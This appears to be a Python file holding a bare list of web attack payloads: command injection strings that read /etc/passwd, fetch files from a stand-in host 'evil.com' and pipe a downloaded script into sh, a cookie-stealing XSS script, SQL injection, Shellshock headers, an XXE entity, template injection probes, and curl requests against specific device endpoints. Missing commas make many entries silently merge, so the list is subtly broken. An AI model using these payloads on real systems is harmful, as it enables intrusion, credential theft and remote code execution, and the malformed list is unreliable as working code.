payloads = [
    "cmd=0.0.0.0$(pwd)&ipv4_ipv6=0&user_get_phone_ping, ; import os; os.system('whoami')"
    "; import os; os.system('whoami')",
    "; import os; os.system('ls')",
    "; import os; os.system('cat /etc/passwd')",
    "; import os; os.system('wget http://evil.com/malicious_file')",
    "; puts `whoami`",
    "; puts `ls`",
    "; puts `cat /etc/passwd`",
    "; puts `curl -O http://evil.com/malicious_file`",
    "<script>alert('XSS')</script>",
    "<script>document.location='http://evil.com/steal_cookies?cookie='+document.cookie</script>"
    "; ls"
    "; cat /etc/passwd"
    "; curl http://evil.com/malicious_script.sh | sh"
    "' or 'a'='a"
    "' or 1=1 or 'a'='a"
    "() { :;}; /bin/sleep 0"
    '''
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <userInfo>
         <name>&xxe;</name>
        </userInfo> 
    '''
    '''
    {{ 7*'7' }}
            {{ [].class.baseClasses.class.__subclasses__() }}
    '''
    ''' 
    $ curl -s http://TARGET/DataLogView.php?eventFileSelected=;id
    $ curl -s http://TARGET/EventsView.php?eventFileSelected=|id
    $ curl -s http://TARGET/AlarmsView.php?eventFileSelected=`id`
    $ curl -s http://TARGET/index.php --data="userName=;sleep%2017&pseudonym=251"
    $ sleep 3
    $ #Reflected URL Address Bar: http://TARGET/index.php?userName=thricer&sessionCode=/var/www/html
    put "google.com|ls"
    cmd=; id;&token=1714636915c6acea98
    curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http:/DVR_ADDR/cgi-bin/slogin/login.py
    op=export&language=english&interval=1&object_id=`sleep 10`
    export PAYLOAD="firefox google.com"
    admin:$1$FZ6rOGS1$54ZXSmjh7nod.kXFRyLx70:0:0:root:/:/bin/sh
    '''

]